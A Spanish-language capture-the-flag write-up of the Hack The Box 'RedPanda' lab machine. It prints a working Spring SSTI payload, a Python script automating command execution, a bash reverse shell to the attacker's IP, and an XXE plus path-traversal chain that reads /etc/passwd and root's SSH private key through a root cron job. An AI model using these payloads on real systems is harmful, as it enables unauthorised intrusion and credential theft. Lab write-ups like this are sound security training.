+++
author = "Andrés Del Cerro"
title = "Hack The Box: RedPanda Writeup | Easy"
date = "2024-08-02"
description = ""
tags = [
    "HackTheBox",
    "RedPanda",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "SSTI",
    "Linux",
    "XXE",
    "Spring Boot",
    "Abusing Cron",
    "Scripting",
    "Information Leakage",
    "Abusing Java Application"
]

+++

# Hack The Box: RedPanda Writeup

Welcome to my detailed writeup of the easy difficulty machine **"RedPanda"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```shell
$ rustscan -a 10.129.227.207 --ulimit 5000 -g
10.129.227.207 -> [22,8080]
```

```shell
$ nmap -p22,8080 -sCV 10.129.227.207 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 21:19 CEST
Nmap scan report for 10.129.227.207
Host is up (0.036s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 02 Aug 2024 17:20:08 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 02 Aug 2024 17:20:08 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 02 Aug 2024 17:20:08 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=8/2%Time=66AD3154%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;char
SF:set=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2002\x20Aug\x
SF:202024\x2017:20:08\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woo
SF:den_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://code
SF:pen\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"style
SF:sheet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text
SF:/css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x2
SF:0with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x2
SF:0\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20cl
SF:ass='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x2
SF:0right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left
SF:'>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20
SF:\x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20
SF:</div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200
SF:\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20
SF:Fri,\x2002\x20Aug\x202024\x2017:20:08\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20tex
SF:t/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x204
SF:35\r\nDate:\x20Fri,\x2002\x20Aug\x202024\x2017:20:08\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\
SF:x20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20
SF:h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1
SF:\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14
SF:px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{hei
SF:ght:1px;background-color:#525D76;border:none;}</style></head><body><h1>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></ht
SF:ml>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
```

# UDP Enumeration
```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.227.207 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 21:20 CEST
Nmap scan report for 10.129.227.207
Host is up (0.036s latency).
Not shown: 1495 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    closed domain
1025/udp  closed blackjack
19718/udp closed unknown
24388/udp closed unknown
57977/udp closed unknown
```

Solo vemos los puertos 22/TCP y 8080/TCP
Así que la vía de explotación debe de ser por el servicio web.

# Foothold
```shell
$ whatweb http://10.129.227.207:8080
http://10.129.227.207:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.129.227.207], Title[Red Panda Search | Made with Spring Boot]
```

Sabemos que la aplicación web está hecha en Spring Boot, Java.

Vemos que tiene una funcionalidad de búsqueda y mi input se representa en pantalla, esto ya me hace pensar en intentar realizar un SSTI.
![Write-up Image](images/Screenshot_1.png)

Parece que tiene un filtro de caracteres.

![Write-up Image](images/Screenshot_2.png)
Pero reemplazando el `$` por `*` , ya que en Spring se puede realizar "templates" con ese formato, conseguimos que se interprete código, confirmando el SSTI.
![Write-up Image](images/Screenshot_3.png)

Utilizando un payload de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`

Tenemos RCE como el usuario `woodenk`
![Write-up Image](images/Screenshot_4.png)

Por consola...
```shell
$ curl -s -X POST http://10.129.227.207:8080/search --data "name=*%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D" | html2text
[name                ]
***** You searched for: uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000
(woodenk) *****
***** There are 0 results for your search *****
```

# Scripting the SSTI
Inspirándome del gran s4vitar, me apetecía hacer un script en Python para automatizar el SSTI.

```python
import requests
from bs4 import BeautifulSoup
import signal
from prompt_toolkit import PromptSession
from prompt_toolkit.keys import Keys

ENDPOINT_URL = "http://10.129.227.207:8080/search"

def def_handler(x,y):
    print("\n[+] Saliendo...")
    exit(1)

signal.signal(signal.SIGINT, def_handler)


def ssti(command):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('<COMMAND>').getInputStream())}"
    data = {
        "name": payload.replace("<COMMAND>", command)
    }
    r = requests.post(ENDPOINT_URL, headers = headers, data=data)
    soup = BeautifulSoup(r.text, 'html.parser')
    output = soup.find('h2', class_='searched').text.replace('You searched for: ', '')
    output
    print(output)
    
if __name__ == "__main__":
    session = PromptSession()
    while True:
        try:
            cmd = session.prompt('> ')
            if cmd == 'q': # Salir
                def_handler(1,1)
            ssti(cmd)
        except KeyboardInterrupt:
            break
```

De esta forma obtenemos una pseudo-consola a través del SSTI.
```shell
$ python3 ssti.py 
> whoami
woodenk

> id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

> ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:46:df brd ff:ff:ff:ff:ff:ff
    inet 10.129.227.207/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3560sec preferred_lft 3560sec
    inet6 dead:beef::250:56ff:fe94:46df/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:fe94:46df/64 scope link 
       valid_lft forever preferred_lft forever

>
```

Podemos encontrar la flag en `/home/woodenk/user.txt`

```shell
> cat /home/woodenk/user.txt
6abbc8d3fda37801....
```

# Privilege Escalation
Como no hay otro usuario a parte de `root`, supongo que no habrá que hacer User Pivoting.

Antes de escalar, voy a mandarme una full tty.

```shell
#!/bin/bash
#rev.sh

bash -c "bash -i >& /dev/tcp/10.10.14.80/443 0>&1"
```

```shell
> wget http://10.10.14.80:8081/rev.sh

> dir
883  rev.sh

> chmod +x rev.sh

> ./rev.sh
```

Me llama la atención que estemos en un grupo llamado `logs`
```shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id   
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```


Encontramos un directorio `/credits` con unos archivos un tanto extraños
```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Pertenecen al grupo `logs`
```
-rw-r-----  1 root logs  422 Jun 21  2022 damian_creds.xml
-rw-r-----  1 root logs  426 Jun 21  2022 woodenk_creds.xml
```

Encontramos un proyecto nuevo en Java, `LogParser`
![Write-up Image](images/Screenshot_5.png)

El archivo main de este proyecto es el siguiente.
```java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

Vemos que se están almacenando logs en `/opt/panda_search_redpanda.log`

```shell
cat redpanda.log

404||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0||/cualquiera
404||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0||/error
```

Lee el campo `Artist` de los metadatos de una imagen JPG que se almacena en `/opt/panda_search/src/main/resources/static`
![Write-up Image](images/Screenshot_6.png)

Luego crea un archivo XML representando varios campos
![Write-up Image](images/Screenshot_7.png)

En el main, se utiliza el nombre extraido de los metadatos para crear una ruta `NOMBRE_creds.xml`, que pasa al método `addViewTo`

Luego `addViewTo` parsea el XML, incrementando las visitas relacionadas con el autor de dicha imagen y escribe el archivo de vuelta.
![Write-up Image](images/Screenshot_8.png)

Detalle de la aplicación:
1. **Método `parseLog(String line)`**:
    
    - **Función**: Divide una línea de registro en partes usando el delimitador `||` y almacena los valores en un `Map`.
    - **Contenido del `Map`**:
        - `"status_code"`: Código de estado (entero).
        - `"ip"`: Dirección IP.
        - `"user_agent"`: Agente de usuario.
        - `"uri"`: URI del recurso.
2. **Método `isImage(String filename)`**:
    
    - **Función**: Verifica si el archivo tiene una extensión `.jpg`. Retorna `true` si es una imagen JPEG, `false` de lo contrario.
3. **Método `getArtist(String uri)`**:
    
    - **Función**: Lee los metadatos EXIF de una imagen JPEG y busca el nombre del artista en los datos.
    - **Ruta del archivo**: Construye la ruta del archivo utilizando el URI proporcionado y lee el archivo JPEG.
    - **Retorno**: Devuelve el nombre del artista si se encuentra, o `"N/A"` si no se encuentra el campo de artista.
4. **Método `addViewTo(String path, String uri)`**:
    
    - **Función**: Actualiza el contador de visualizaciones en un archivo XML dado el URI de la imagen.
    - **Proceso**:
        - Lee el archivo XML y lo analiza.
        - Busca el elemento `<image>` cuyo `<uri>` coincida con el URI proporcionado.
        - Incrementa el conteo de visualizaciones para esa imagen y para el total de visualizaciones.
        - Escribe los cambios de vuelta al archivo XML.
5. **Método `main(String[] args)`**:
    
    - **Función**: El punto de entrada del programa.
    - **Proceso**:
        - Lee el archivo de registro (`redpanda.log`).
        - Procesa cada línea para determinar si corresponde a una imagen.
        - Si es una imagen, extrae la URI y busca el nombre del artista.
        - Actualiza el archivo XML correspondiente al artista con el nuevo conteo de visualizaciones.

### Ejecución y Flujo de Datos

1. **Lectura del Log**: Se lee línea por línea desde `redpanda.log`. Cada línea es analizada para extraer detalles como el URI de la imagen.
    
2. **Verificación de Imagen**: Se verifica si el URI corresponde a un archivo JPEG.
    
3. **Extracción de Artista**: Si es una imagen, se obtiene el nombre del artista desde los metadatos EXIF de la imagen.
    
4. **Actualización del XML**: Se actualiza el archivo XML asociado con el artista para reflejar el nuevo número de visualizaciones de la imagen.


Como nosotros controlamos el campo `Artist` de la imagen, podríamos realizar un `XXE`, pero claro, de nada me sirve si `root` no ejecuta este script.

Y como me esperaba, hay una tarea CRON que ejecuta `root` donde cada X tiempo se ejecuta este archivo .jar
![Write-up Image](images/Screenshot_9.png)


Recapitulado, necesito que al método `addViewTo` se pase un archivo que yo controlo, así podría acontecer un XXE y leer archivo como `root`.

Para controlar la ruta al archivo XML, necesito control del campo `Artist` de los metadatos de algún JPG asociado.

Bien, primero vamos a coger el archivo `export.xml` y nos lo vamos a guardar para añadir el payload para cargar `/etc/passwd` para hacer esta PoC.


Esto no lo he añadido, pero este `export.xml` viene de la aplicación web.
Del archivo `MainController.java`

Tiene este endpoint.
```java
@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
```

```shell
$ curl -s http://10.129.227.207:8080/export.xml?author=woodenk > export.xml
```

Introducimos el típico payload XXE.
![Write-up Image](images/Screenshot_10.png)

Ahora nos tenemos que descargar alguna de las imagenes para modificar los metadatos.

```shell
$ wget http://10.129.227.207:8080/img/greg.jpg
```

```shell
$ exiftool greg.jpg 
ExifTool Version Number         : 12.57
File Name                       : greg.jpg
Directory                       : .
File Size                       : 103 kB
File Modification Date/Time     : 2022:06:22 11:07:03+02:00
File Access Date/Time           : 2024:08:02 22:18:54+02:00
File Inode Change Date/Time     : 2024:08:02 22:18:54+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
Artist                          : woodenk
XMP Toolkit                     : XMP Core 4.4.0-Exiv2
Document ID                     : gimp:docid:gimp:fdfbabec-5c75-44cd-9abc-0660f147312c
Instance ID                     : xmp.iid:fa5469f5-219c-4d11-9329-67019e8b46d5
Original Document ID            : xmp.did:3401fe2c-71a5-4894-895f-8a9822ccfb45
Api                             : 2.0
Platform                        : Windows
Time Stamp                      : 1617795171484223
Version                         : 2.10.22
Format                          : image/jpeg
Creator Tool                    : GIMP 2.10
Location Created                : 
Location Shown                  : 
Artwork Or Object               : 
Registry ID                     : 
History Action                  : saved
History Changed                 : /
History Instance ID             : xmp.iid:0a506af3-72a2-4843-8711-8117fc9329b9
History Software Agent          : Gimp 2.10 (Windows)
History When                    : 2021:04:07 12:32:51
Image Supplier                  : 
Image Creator                   : 
Copyright Owner                 : 
Licensor                        : 
Profile CMM Type                : Little CMS
Profile Version                 : 4.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2021:04:07 11:29:52
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
Image Width                     : 600
Image Height                    : 720
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 600x720
Megapixels                      : 0.432
```

Ahora editamos el campo `Artist` para hacer el Path Traversal para poder cargar el `pointed_creds.xml` y no el que debería de cargar.

```shell
$ exiftool -Artist="../../../../../tmp/pointed" pointed.jpg 
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - pointed.jpg
    1 image files updated
```

```shell
$ exiftool pointed.jpg | grep Artist
Artist                          : ../../../../../tmp/pointed
```


Ahora nos descargamos la imagen y el XML con el payload en la máquina víctima en el directorio `/tmp/`

```shell
woodenk@redpanda:/tmp$ wget http://10.10.14.80:8081/pointed.jpg
```

```shell
woodenk@redpanda:/tmp$ wget http://10.10.14.80:8081/pointed_creds.xml

```

Y solo falta modificar el `User-Agent` para poder escribir el log malicioso.

![Write-up Image](images/Screenshot_11.png)

Aunque debe de ser una petición existosa.
Así que vamos a modificar el log directamente ya que tenemos acceso a la máquina víctima y permisos para poder modificar el archivo `redpanda.log`

```shell
woodenk@redpanda:/opt/panda_search$ echo '200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg' > redpanda.log
<|/../../../../../../tmp/pointed.jpg' > redpanda.log
woodenk@redpanda:/opt/panda_search$ cat redpanda.log 
cat redpanda.log 
200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg
woodenk@redpanda:/opt/panda_search$
```

Ahora cuando se ejecute la tarea CRON, lo que pasará es que al parsearse el log, la URL valdrá `/../../../../../../../tmp/pointed.jpg`

Esto hará que se cree un `path` en `/opt/panda_search/src/main/resources/static/../../../../../../../tmp/pointed.jpg`

Luego se leerá el metadato de la imagen que es `../../../../../../tmp/pointed` y creará la ruta `/credits/../tmp/pointed_creds.xml`
Esto leerá el XML con el payload por lo cual leerá el contenido del `/etc/passwd` y al intentar incrementar en "1" las visitas, se exportará el `/etc/passwd` en el campo.

```shell
woodenk@redpanda:/tmp$ cat pointed_creds.xml
cat pointed_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>pointed</author>
  <image>
    <uri>../../../../../../../pointed.jpg</uri>
    <views>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```

Y se acontece perfectamente el XXE.

Ahora vamos a intentar leer la id_rsa del usuario `root` , a ver si existe.
Solamente modificamos el archivo a leer
![Write-up Image](images/Screenshot_12.png)

Agregamos de nuevo el log...
```shell
woodenk@redpanda:/opt/panda_search$ echo '200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg' > redpanda.log
<|/../../../../../../tmp/pointed.jpg' > redpanda.log
woodenk@redpanda:/opt/panda_search$ cat redpanda.log 
cat redpanda.log 
200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg
woodenk@redpanda:/opt/panda_search$
```

Y si leemos el archivo `/tmp/pointed_creds.xml` de nuevo...
```shell
woodenk@redpanda:/opt/panda_search$ cat /tmp/pointed_creds.xml
cat /tmp/pointed_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>pointed</author>
  <image>
    <uri>../../../../../../../pointed.jpg</uri>
    <views>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```

Ya simplemente accedemos como `root` a la máquina víctima.
```shell
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/redpanda/content]
└──╼ [★]$ micro id_rsa
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/redpanda/content]
└──╼ [★]$ chmod 600 id_rsa 
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/redpanda/content]
└──╼ [★]$ ssh root@10.129.227.207 -i id_rsa
....

root@redpanda:~# whoami
root
root@redpanda:~#
```


Y ya podríamos leer la flag.
```shell
root@redpanda:~# cat root.txt
885458dc9ef800f1...
```


Happy Hacking! 🚀